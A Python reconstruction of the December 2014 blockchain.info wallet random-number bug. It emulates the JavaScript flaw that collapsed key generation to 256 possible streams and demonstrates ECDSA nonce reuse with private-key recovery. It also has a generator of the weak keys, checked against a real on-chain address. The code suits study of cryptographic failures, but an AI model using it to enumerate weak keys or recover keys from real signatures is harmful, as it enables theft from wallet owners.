# """
# Python model of the Dec 2014 blockchain.info RNG collapse.

# The wallet's jsbn RNG was JavaScript. To reproduce the bug faithfully this file
# emulates the JavaScript semantics it depended on:

#   * arrays are objects: rng_pool["NaN"] is a named property, not an element,
#     and does not change rng_pool.length
#   * undefined++ -> NaN, NaN++ -> NaN, NaN >= 256 -> false
#   * undefined ^ v -> v          (ToInt32(undefined) == 0)
#   * x >> i uses ToInt32(x)      (floats truncated, wrapped to signed 32-bit)
#   * i % 0 -> NaN, key[NaN] reads the "NaN" property
#   * (j + S[i] + undefined) & 255 -> 0
# """

# import hashlib
# import os
# import random
# import time

# NAN = "NaN"
# UNDEFINED = "undefined"
# RNG_PSIZE = 256


# def to_int32(x):
#     x = int(x) & 0xFFFFFFFF
#     return x - (1 << 32) if x & 0x80000000 else x


# def js_shr(x, n):
#     return to_int32(x) >> n


# class JSArray:
#     """Just enough of a JavaScript Array: integer elements plus named properties."""

#     def __init__(self):
#         self.props = {}

#     def _key(self, k):
#         if k is None:
#             return UNDEFINED
#         if k == NAN:
#             return NAN
#         return int(k)

#     def get(self, k):
#         return self.props.get(self._key(k))  # None plays the role of undefined

#     def xor_set(self, k, v):
#         old = self.get(k)
#         self.props[self._key(k)] = (0 if old is None else old) ^ v

#     def set(self, k, v):
#         self.props[self._key(k)] = v

#     @property
#     def length(self):
#         idx = [k for k in self.props if isinstance(k, int)]
#         return max(idx) + 1 if idx else 0


# def js_inc(v):
#     """Value of v after v++ (the expression yields the old v)."""
#     if v is None or v == NAN:
#         return NAN
#     return v + 1


# class Arcfour:
#     def __init__(self):
#         self.i = 0
#         self.j = 0
#         self.S = list(range(256))

#     def init(self, key):
#         j = 0
#         for i in range(256):
#             klen = key.length
#             k = key.get(NAN if klen == 0 else i % klen)  # i % 0 is NaN in JS
#             if k is None:
#                 j = 0  # NaN & 255 == 0
#             else:
#                 j = (j + self.S[i] + k) & 255
#             self.S[i], self.S[j] = self.S[j], self.S[i]
#         self.i = 0
#         self.j = 0

#     def next(self):
#         self.i = (self.i + 1) & 255
#         self.j = (self.j + self.S[self.i]) & 255
#         self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]
#         return self.S[(self.S[self.i] + self.S[self.j]) & 255]


# class JsbnRNG:
#     """bitcoinjs.js rng.js after the Dec 2014 rewrite, with the index reset optional."""

#     def __init__(self, init_pptr):
#         self.pool = JSArray()
#         self.pptr = 0 if init_pptr else None  # the missing "rng_pptr = 0"
#         self.state = None

#         # Strong entropy (crypto.getRandomValues), 64 x 32-bit words
#         for _ in range(RNG_PSIZE // 4):
#             self.seed_int(int.from_bytes(os.urandom(4), "little", signed=True))
#         # Plus Math.random()
#         for _ in range(RNG_PSIZE // 2):
#             self.seed_int(65536 * random.random(), 16)

#     def seed_int(self, x, n=32):
#         for i in range(0, n - 7, 8):
#             if js_shr(x, i):
#                 k = self.pptr
#                 self.pptr = js_inc(self.pptr)
#                 self.pool.xor_set(k, js_shr(x, i) & 255)
#             if self.pptr != NAN and self.pptr >= RNG_PSIZE:  # NaN >= 256 is false
#                 self.pptr -= RNG_PSIZE

#     def seed_time(self):
#         self.seed_int(int(time.time() * 1000))

#     def get_byte(self):
#         if self.state is None:
#             self.seed_time()
#             self.state = Arcfour()
#             self.state.init(self.pool)
#             for p in range(self.pool.length):  # never runs when length == 0
#                 self.pool.set(p, 0)
#             self.pptr = 0
#         return self.state.next()

#     def next_bytes(self, n):
#         return bytes(self.get_byte() for _ in range(n))


# def run(init_pptr, trials):
#     outputs = set()
#     for t in range(trials):
#         rng = JsbnRNG(init_pptr)
#         if t == 0:
#             named = sorted(str(k) for k in rng.pool.props if not isinstance(k, int))
#             print(f"  pool.length = {rng.pool.length}, named props = {named}, rng_pptr = {rng.pptr}")
#         outputs.add(rng.next_bytes(32))
#     print(f"  distinct 32-byte outputs from {trials} runs: {len(outputs)}")
#     return outputs


# # --- secp256k1 ECDSA, only what is needed to show k reuse -----------------

# P = 2**256 - 2**32 - 977
# N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
# G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
#      0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)


# def ec_add(a, b):
#     if a is None:
#         return b
#     if b is None:
#         return a
#     if a[0] == b[0] and (a[1] + b[1]) % P == 0:
#         return None
#     if a == b:
#         lam = 3 * a[0] * a[0] * pow(2 * a[1], -1, P) % P
#     else:
#         lam = (b[1] - a[1]) * pow(b[0] - a[0], -1, P) % P
#     x = (lam * lam - a[0] - b[0]) % P
#     return x, (lam * (a[0] - x) - a[1]) % P


# def ec_mul(k, pt=G):
#     out = None
#     while k:
#         if k & 1:
#             out = ec_add(out, pt)
#         pt = ec_add(pt, pt)
#         k >>= 1
#     return out


# def get_big_random(rng):
#     """ECDSA.getBigRandom(n): 256 random bits, mod (n - 1), + 1."""
#     return int.from_bytes(rng.next_bytes(32), "big") % (N - 1) + 1


# def sign(z, d, k):
#     r = ec_mul(k)[0] % N
#     s = pow(k, -1, N) * (z + r * d) % N
#     return r, s


# def demo_k_reuse():
#     d = int.from_bytes(os.urandom(32), "big") % N  # victim's private key
#     z1 = int.from_bytes(hashlib.sha256(b"tx one").digest(), "big")
#     z2 = int.from_bytes(hashlib.sha256(b"tx two").digest(), "big")

#     # Keep signing until the broken RNG hands out the same k twice (birthday bound ~20 tries for 256 values)
#     seen = {}
#     while True:
#         k = get_big_random(JsbnRNG(init_pptr=False))
#         if k in seen:
#             break
#         seen[k] = True
#     r1, s1 = sign(z1, d, k)
#     r2, s2 = sign(z2, d, k)
#     print(f"  signatures made before a repeat: {len(seen) + 1}")
#     print(f"  same R in both signatures: {r1 == r2}")

#     # Attacker, using only public data (r, s1, s2, z1, z2):
#     k_rec = (z1 - z2) * pow(s1 - s2, -1, N) % N
#     d_rec = (s1 * k_rec - z1) * pow(r1, -1, N) % N
#     print(f"  recovered private key matches: {d_rec == d}")


# if __name__ == "__main__":
#     print("Without 'rng_pptr = 0' (the bug):")
#     run(init_pptr=False, trials=5000)
#     print("With 'rng_pptr = 0':")
#     run(init_pptr=True, trials=5000)
#     print("Nonce reuse -> private key recovery:")
#     demo_k_reuse()


"""
Model of the Dec 2014 blockchain.info RNG bug, matched to the real wallet path.

Cause (Bither reconstruction; confirmed by on-chain keys and R values):
  rng_pptr was never set to 0. Writes went to pool["undefined"] then pool["NaN"].
  pool.length stayed 0. ARC4 was keyed only by the single "NaN" byte → 256 streams.

What ECDSA.getBigRandom(n) actually did in bitcoinjs (jsbn):
  new BigInteger(n.bitLength(), rng)   // 256 → 33 bytes, then x[0] = 0
    .mod(n - 1).add(1)

After the collapse, one page load / Web Worker is fully determined by that NaN
byte (0..255). Successive getBigRandom calls walk that ARC4 stream (draw 0, 1, …).
"""

from __future__ import annotations

import hashlib
import os
import random
import time

NAN = "NaN"
UNDEFINED = "undefined"
RNG_PSIZE = 256

# secp256k1
P = 2**256 - 2**32 - 977
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
G = (
    0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
    0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8,
)


def to_int32(x):
    x = int(x) & 0xFFFFFFFF
    return x - (1 << 32) if x & 0x80000000 else x


def js_shr(x, n):
    return to_int32(x) >> n


def js_inc(v):
    """Post-increment: undefined++ / NaN++ → NaN."""
    if v is None or v == NAN:
        return NAN
    return v + 1


class JSArray:
    """JavaScript Array: integer indices + named props; length ignores named props."""

    def __init__(self):
        self.props = {}

    def _key(self, k):
        if k is None:
            return UNDEFINED
        if k == NAN:
            return NAN
        return int(k)

    def get(self, k):
        return self.props.get(self._key(k))

    def xor_set(self, k, v):
        old = self.get(k)
        self.props[self._key(k)] = (0 if old is None else old) ^ v

    def set(self, k, v):
        self.props[self._key(k)] = v

    @property
    def length(self):
        idx = [k for k in self.props if isinstance(k, int)]
        return max(idx) + 1 if idx else 0


class Arcfour:
    """jsbn prng4.js ARC4."""

    def __init__(self):
        self.i = 0
        self.j = 0
        self.S = list(range(256))

    def init(self, key: JSArray):
        j = 0
        for i in range(256):
            klen = key.length
            # i % 0 → NaN in JS → read key["NaN"]
            k = key.get(NAN if klen == 0 else i % klen)
            if k is None:
                j = 0
            else:
                j = (j + self.S[i] + k) & 255
            self.S[i], self.S[j] = self.S[j], self.S[i]
        self.i = 0
        self.j = 0

    def next(self):
        self.i = (self.i + 1) & 255
        self.j = (self.j + self.S[self.i]) & 255
        t = self.S[self.i]
        self.S[self.i] = self.S[self.j]
        self.S[self.j] = t
        return self.S[(t + self.S[self.i]) & 255]


class JsbnRNG:
    """
    rng.js after the Dec 2014 rewrite.

    init_pptr=True  → correct (rng_pptr = 0 when the pool is created)
    init_pptr=False → bug (pptr left undefined)
    """

    def __init__(self, init_pptr: bool):
        self.pool = JSArray()
        self.pptr = 0 if init_pptr else None
        self.state = None

        # Same mix as the live wallet: getRandomValues words, then Math.random
        for _ in range(RNG_PSIZE // 4):
            self.seed_int(int.from_bytes(os.urandom(4), "little", signed=True))
        for _ in range(RNG_PSIZE // 2):
            self.seed_int(65536 * random.random(), 16)

    def seed_int(self, x, n=32):
        for i in range(0, n - 7, 8):
            if js_shr(x, i):
                k = self.pptr
                self.pptr = js_inc(self.pptr)
                self.pool.xor_set(k, js_shr(x, i) & 255)
            if self.pptr != NAN and self.pptr is not None and self.pptr >= RNG_PSIZE:
                self.pptr -= RNG_PSIZE

    def seed_time(self):
        self.seed_int(int(time.time() * 1000))

    def get_byte(self):
        if self.state is None:
            self.seed_time()
            self.state = Arcfour()
            self.state.init(self.pool)
            for p in range(self.pool.length):
                self.pool.set(p, 0)
            self.pptr = 0
        return self.state.next()

    def next_bytes(self, n):
        return [self.get_byte() for _ in range(n)]


def broken_session(seed_byte: int) -> JsbnRNG:
    """
    A page / Web Worker after the bug: ARC4 already keyed by pool["NaN"] = seed_byte.

    This is the operational model confirmed on-chain (addresses + signature R values).
    """
    if not 0 <= seed_byte <= 255:
        raise ValueError("seed_byte must be 0..255")
    rng = object.__new__(JsbnRNG)
    rng.pool = JSArray()
    rng.pool.set(NAN, seed_byte)
    rng.pptr = NAN
    rng.state = Arcfour()
    rng.state.init(rng.pool)
    return rng


def get_big_random(rng: JsbnRNG, limit: int = N) -> int:
    """ECDSA.getBigRandom(limit) as in unused-My-Wallet bitcoin-js/ecdsa.js + jsbn2.js."""
    a = limit.bit_length()  # 256 for secp256k1 n
    t = a & 7
    x = rng.next_bytes((a >> 3) + 1)  # 33 bytes
    if t > 0:
        x[0] &= (1 << t) - 1
    else:
        x[0] = 0
    value = int.from_bytes(bytes(x), "big")
    return value % (limit - 1) + 1


def draws(seed_byte: int, count: int):
    """First `count` getBigRandom(n) values for a broken session with that seed byte."""
    rng = broken_session(seed_byte)
    for _ in range(count):
        yield get_big_random(rng)


def ec_add(a, b):
    if a is None:
        return b
    if b is None:
        return a
    if a[0] == b[0] and (a[1] + b[1]) % P == 0:
        return None
    if a == b:
        lam = 3 * a[0] * a[0] * pow(2 * a[1], -1, P) % P
    else:
        lam = (b[1] - a[1]) * pow(b[0] - a[0], -1, P) % P
    x = (lam * lam - a[0] - b[0]) % P
    return x, (lam * (a[0] - x) - a[1]) % P


def ec_mul(k, pt=G):
    out = None
    while k:
        if k & 1:
            out = ec_add(out, pt)
        pt = ec_add(pt, pt)
        k >>= 1
    return out


def sign(z, d, k):
    r = ec_mul(k)[0] % N
    s = pow(k, -1, N) * (z + r * d) % N
    return r, s


def demo_collapse(trials=2000):
    print("Bug (rng_pptr never set to 0) — first getBigRandom(n) per page load:")
    first = set()
    for t in range(trials):
        rng = JsbnRNG(init_pptr=False)
        if t == 0:
            named = sorted(str(k) for k in rng.pool.props if not isinstance(k, int))
            print(f"  pool.length={rng.pool.length} props={named} pptr={rng.pptr}")
        first.add(get_big_random(rng))
    print(f"  distinct first draws from {trials} loads: {len(first)}")

    print("Fixed (rng_pptr = 0):")
    first_ok = set()
    for t in range(trials):
        rng = JsbnRNG(init_pptr=True)
        if t == 0:
            print(f"  pool.length={rng.pool.length} pptr after seed={rng.pptr}")
        first_ok.add(get_big_random(rng))
    print(f"  distinct first draws from {trials} loads: {len(first_ok)}")


def demo_broken_session_is_seed_byte():
    """
    After first get_byte, ARC4 was keyed by whatever ended up in pool["NaN"]
    (all prior entropy + the seed_time() call inside get_byte). That final byte
    is the seed_byte list_256 enumerates; broken_session(byte) replays it.
    """
    print("broken_session(final NaN byte) replays a collapsed page load:")
    for _ in range(3):
        rng = JsbnRNG(init_pptr=False)
        k1 = get_big_random(rng)
        seed = rng.pool.get(NAN)  # still there: length-0 clear never wipes named props
        k2 = get_big_random(broken_session(seed))
        print(f"  NaN byte={seed:3}: replay match={k1 == k2}")


def demo_cross_user_r_reuse():
    """
    Two users, same seed byte, each takes draw 0 as nonce → same R.
    That is what johoe's repeated-R scanner saw (not same page, same weak world).
    """
    print("Cross-user nonce reuse (same seed_byte, draw 0):")
    d1 = int.from_bytes(os.urandom(32), "big") % N
    d2 = int.from_bytes(os.urandom(32), "big") % N
    z1 = int.from_bytes(hashlib.sha256(b"tx A").digest(), "big")
    z2 = int.from_bytes(hashlib.sha256(b"tx B").digest(), "big")
    seed = 69
    k = get_big_random(broken_session(seed))  # draw 0
    r1, s1 = sign(z1, d1, k)
    r2, s2 = sign(z2, d2, k)
    print(f"  same R: {r1 == r2}")
    # With known k (or two sigs sharing R), recover either key:
    d1_rec = (s1 * k - z1) * pow(r1, -1, N) % N
    print(f"  recovered d1 from one sig + known k: {d1_rec == d1}")


def demo_known_onchain_key():
    """Spot-check: seed 246 draw 0 was 1QCRoj5d… (~100 BTC on 8 Dec 2014)."""
    k = next(draws(246, 1))
    x, y = ec_mul(k)
    pub = b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")
    h = hashlib.new("ripemd160", hashlib.sha256(pub).digest()).digest()
    # Base58Check
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    payload = b"\0" + h
    data = payload + hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = alphabet[r] + out
    addr = "1" * (len(data) - len(data.lstrip(b"\0"))) + out
    expect = "1QCRoj5dPAsADvzd2o7NBy6kywBEkfC1Xh"
    print(f"On-chain spot check seed=246 draw=0:")
    print(f"  address={addr}")
    print(f"  matches known hit: {addr == expect}")


if __name__ == "__main__":
    demo_collapse()
    demo_broken_session_is_seed_byte()
    demo_cross_user_r_reuse()
    demo_known_onchain_key()

    print(ec_mul(11098019427687408197838162871403618705631976214327405852636718162156955082409))
